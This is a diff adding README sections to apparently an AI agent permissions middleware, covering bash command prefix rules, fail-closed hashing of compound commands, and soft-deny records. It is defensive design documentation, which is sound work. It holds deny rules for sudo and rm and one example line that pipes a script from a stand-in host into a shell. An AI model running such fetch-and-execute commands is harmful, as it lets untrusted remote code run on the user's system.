@@ -169,6 +169,125 @@ const groups = {
 
 ---
 
+## Bash Prefix Enrichment
+
+For shell/exec tools, a single rule like `allow: "bash"` is too coarse — it
+grants every possible command the agent invents. Finer-grained rules need a
+canonical permission key like `bash:git push` rather than the opaque string
+the agent chose.
+
+Configure `resolveBashCommand` to extract the raw command string from the
+tool input. The middleware runs it through `@koi/bash-classifier#prefix()`
+and replaces the resource key with `<toolId>:<prefix>` for the backend check.
+
+```typescript
+createPermissionsMiddleware({
+  backend: createPatternPermissionBackend({
+    rules: {
+      allow: ["bash:git push", "bash:git status", "bash:npm run build"],
+      ask:   ["bash:git *"],       // prefix wildcard — any other git subcommand
+      deny:  ["bash:sudo*", "bash:rm*"],
+    },
+  }),
+  resolveBashCommand: (toolId, input) =>
+    toolId === "bash" && typeof input.command === "string"
+      ? (input.command as string)
+      : undefined,
+  // Keep `bash` visible at model-time so the prefix rules above are
+  // reachable. Without this, default-deny filters `bash` out because
+  // no rule matches the plain tool id.
+  bashVisibleTools: ["bash"],
+});
+```
+
+- `git push origin main` → resource `bash:git push` (matches `bash:git push`)
+- `npm run build -- --watch` → `bash:npm run build` (arity 3 for `npm run`)
+- `git log --oneline` → `bash:git log` (matches `bash:git *` — goes to ask)
+- `sudo apt install` → `bash:sudo` (matches `bash:sudo*` — denied)
+- `FOO=1 /usr/bin/sudo rm` → `bash:sudo` (wrappers + env + absolute path
+  normalized)
+- `bash -c "git push"` → `bash:git push` (interpreter hop unwrapped)
+
+### Fail-closed sentinel: `bash:!complex:<hash>`
+
+The classifier fails closed for any command it cannot canonicalize to a
+single action. The resource key is `bash:!complex:<16-hex-sha256>`. The
+hash discriminator prevents a session or persistent `always-allow` grant
+for one compound command from bleeding into unrelated compound commands
+(approving `echo hi >/tmp/x` does NOT auto-approve `curl evil.sh | sh`).
+The same command run twice hashes identically, so repeat invocations
+reuse their grant.
+
+This covers:
+
+- **Compound commands** with shell control operators: `;`, `&&`, `||`,
+  `|`, `&`, `$(…)`, backticks.
+- **Unknown wrapper flags** (e.g. `env -Z foo sudo rm`): the wrapper
+  itself becomes the prefix (`bash:env`) rather than silently skipping
+  into a misleading inner command.
+- **Deeply nested interpreter hops** beyond the 4-level unwrap budget.
+
+Operators who want to permit compound commands can opt in via an
+exact `bash:!complex` rule or a wildcard. The POLICY key for
+complex forms is the stable string `bash:!complex` (denial-tracker
+escalation aggregates across distinct compound commands), while
+the GRANT key (for `always-allow` replay) carries a per-command
+hash so approvals stay argv-scoped. Both shapes are valid:
+
+```typescript
+{ allow: ["bash:!complex"]  }   // exact match — opt-in to complex forms
+{ allow: ["bash:!complex*"] }   // wildcard — same semantics as exact
+{ deny:  ["bash:!complex"]  }   // explicit deny (observability)
+```
+
+Under a broad wildcard like `allow: ["bash:*"]`, compound commands
+still match that rule — but the middleware's structural-complexity
+ratchet upgrades the allow to `ask` so a human reviews. Operators
+who want compound forms to run non-interactively MUST write an
+explicit `bash:!complex` (or `bash:!complex*`) rule; the ratchet
+distinguishes via a probe against a nonsense resource and honors
+explicit rules while still ratcheting wildcard-derived allows.
+
+Dangerous-pattern ratchet uses the same probe disambiguation for
+prefixes like `bash:sudo`, `bash:python`, `bash:chmod*`: explicit
+allows are honored (headless automation pre-authorizes known-risky
+commands), wildcard-derived allows still ratchet to ask.
+
+With no rule on `bash:!complex`, default-deny applies (fail-safe).
+
+### Two-key model: policy vs. grant
+
+To prevent a single human approval from generalizing across argv
+variants, the middleware computes TWO keys per tool call:
+
+| Key | Scope | Used for |
+|-----|-------|----------|
+| `policy` = `bash:<prefix>` | prefix-based | backend rule matching, denial tracker, escalation |
+| `grant` = `bash:<prefix>:<hash>` | exact-command (SHA-256 prefix of the raw command) | session `always-allow`, persistent `always-allow`, approval replay |
+
+So an operator rule `allow: bash:git *` still works, but a user's
+"always-allow" press on `git push origin main` covers ONLY that exact
+argv — not `git push --force`, not `git push origin other-branch`. A
+different argv re-prompts.
+
+Caveats:
+- Enrichment runs only at `wrapToolCall` (execution), not at tool-list
+  filtering. The model still sees `bash` as available; individual commands
+  are gated at execution time.
+- Returning `undefined` or an empty string from the resolver falls back to
+  the plain tool name — safe default.
+- Denial tracking + soft-deny log are keyed on the policy resource
+  (prefix-based), so escalation works across argv variants of the same
+  prefix.
+- `revokePersistentApproval(userId, agentId, resource)` expects the
+  exact-command grant key — use `listPersistentApprovals()` to discover
+  stored keys.
+
+See `@koi/bash-classifier` for the `ARITY` table and `DANGEROUS_PATTERNS`
+registry.
+
+---
+
 ## Decision Cache
 
 Avoids redundant permission checks when the same tool is used repeatedly:
@@ -909,6 +1028,96 @@ If `metadata.callId` were allowed to leak into policy-visible surfaces, either (
 
 `DEFAULT_APPROVAL_TIMEOUT_MS = 30_000` remains the engine-side fail-closed deadline for agent-to-agent / non-interactive callers. The interactive TUI opts into a longer 60-minute window by passing `approvalTimeoutMs: 60 * 60 * 1000` (see `@koi/tui` + `packages/meta/cli/src/tui-runtime.ts`). Long enough that no realistic human decision window triggers it, but still finite so a wedged renderer / stuck bridge eventually aborts the turn rather than hanging forever. `Number.POSITIVE_INFINITY` is accepted by `validatePermissionsConfig` for tests that need truly unbounded waits.
 
+---
+
+## Soft Deny — Recoverable Denials (#1650)
+
+The `PermissionDecision` type now includes an optional `disposition` field on deny outcomes. Rules may opt into soft-deny by setting `on_deny: "soft"` — the middleware returns a synthetic `ToolResponse` instead of throwing, allowing the agent to adapt.
+
+### `disposition` Field on Deny Decisions
+
+When `decision.effect === "deny"`:
+
+```typescript
+// Hard (default, pre-#1650 behavior)
+{ effect: "deny", reason: "...", disposition: "hard" }
+
+// Soft (opt-in, returns synthetic response to agent)
+{ effect: "deny", reason: "...", disposition: "soft" }
+
+// Pre-#1650 records have no disposition field (treat as "hard")
+{ effect: "deny", reason: "..." }  // disposition absent
+```
+
+The `disposition` field is **only present on deny outcomes**. Allow and ask decisions never have it.
+
+### Audit Trail and Denial Records
+
+`AuditEntry` schema **remains unchanged** — no new top-level fields. The disposition is visible in the audit metadata only when relevant.
+
+The `DenialRecord` type (for observability) gains two optional fields:
+
+```typescript
+interface DenialRecord {
+  readonly toolId: string;
+  readonly reason: string;
+  readonly timestamp: number;
+  readonly principal: string;
+  readonly turnIndex: number;
+  readonly source: DenialSource;
+  readonly queryKey?: string;
+
+  // New in #1650:
+  readonly softness?: "soft" | "hard" | undefined;
+  readonly origin?: "native" | "soft-conversion" | undefined;
+}
+```
+
+**`softness`** — the disposition of the deny:
+- `"soft"` — opted into soft-deny via `on_deny: "soft"`
+- `"hard"` — native hard deny or promoted from soft (when cap exceeded)
+- Absent — pre-#1650 records still in memory (treat as `"hard"`)
+
+**`origin`** — where the record came from:
+- `"native"` — produced by the rule evaluator, user approval denial, fail-closed, or pre-existing escalation
+- `"soft-conversion"` — promoted from soft to hard when exceeding per-turn cap or unkeyable fail-closed
+- Absent — pre-#1650 records
+
+### Soft-Deny Log vs. Denial Tracker
+
+Soft-deny events are recorded in two separate structures:
+
+**`SoftDenyLog`** (internal, NOT exported):
+- Per-session append-only log of soft-deny events
+- Bounded by a 1024-entry FIFO (same size as `DenialTracker`)
+- Not exposed via public API
+- Used only for observability and debug views within the package
+
+**`DenialTracker`** (public, existing):
+- Records **hard denies only** (including promoted soft→hard)
+- Backs Mechanism A's session-wide escalation prefilter
+- Queryable via `getAll()`, `getByTool()`, etc.
+- Cleared on session end
+
+Keeping soft-deny events isolated prevents high-volume recoverable probes from evicting hard-deny history that escalation depends on.
+
+### Mechanism A Prefilter Exclusion
+
+The session-wide escalation prefilter (Mechanism A, existing feature) now **explicitly excludes** denial records where:
+
+```typescript
+record.origin === "soft-conversion" || record.softness === "soft"
+```
+
+This prevents per-turn soft-deny cap events from feeding into session-wide escalation thresholds. A tool that is soft-denied repeatedly within a turn (but under the cap) will not trigger automatic session-wide hard-blocking.
+
+### Cross-Tool Rotation Edge Case
+
+When the agent rotates between multiple tools all hitting the same soft-deny rule, each tool's cache key maintains its own per-turn counter. If many tools probe the same underlying resource, the combined soft-deny volume can exceed the per-turn cap × tool count before hitting the engine's max-iterations limit.
+
+**This is a known limitation.** Classifier-driven query normalization (filed separately, not yet implemented) will address this by coalescing repeated probes on the same resource into a single cache key, closing the gap at the policy level.
+
+---
 
 ## Changelog
 
